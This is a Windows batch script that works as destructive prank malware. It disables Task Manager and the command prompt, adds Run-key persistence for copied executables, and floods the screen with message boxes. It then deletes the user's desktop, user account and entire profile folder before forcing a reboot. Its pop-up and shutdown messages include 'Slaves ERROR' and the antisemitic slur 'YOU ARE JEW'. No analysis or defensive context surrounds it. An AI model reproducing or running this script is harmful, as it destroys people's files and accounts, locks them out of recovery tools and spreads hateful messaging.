@echo off
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 2 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Notepad /t REG_SZ /d %Systemroot%\System32\notepad.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Calculator /t REG_SZ /d %Systemroot%\System32\calc.exe /f

copy cdf.exe "%systemroot%\System32\cdf.exe"/y
del cdf.exe/q


reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Reboot /t REG_SZ /d %systemroot%\System32\cdf.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v GoodStart /t REG_SZ /d %systemroot%\System32\aftereboot.exe /f

shutdown /a

echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"

shutdown /a

echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Gameover.vbs

shutdown /a

timeout 1 >nul /nobreak

shutdown /a

cd "%userprofile%\Browser"

start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
shutdown /a
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
shutdown /a
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
shutdown /a
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
shutdown /a
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
shutdown /a

timeout 1 >nul /nobreak

shutdown /a

taskkill/im wscript.exe /f

shutdown /a

start Gameover.vbs

shutdown /a

timeout 1 >nul /nobreak

shutdown /a

timeout 1 >nul /nobreak

rd "%userprofile%\desktop"/q /s

timeout 1 >nul /nobreak

net user "%username%" /delete

rd "%userprofile%"/s /q

shutdown /r /c "YOU ARE JEW" /t 3 /f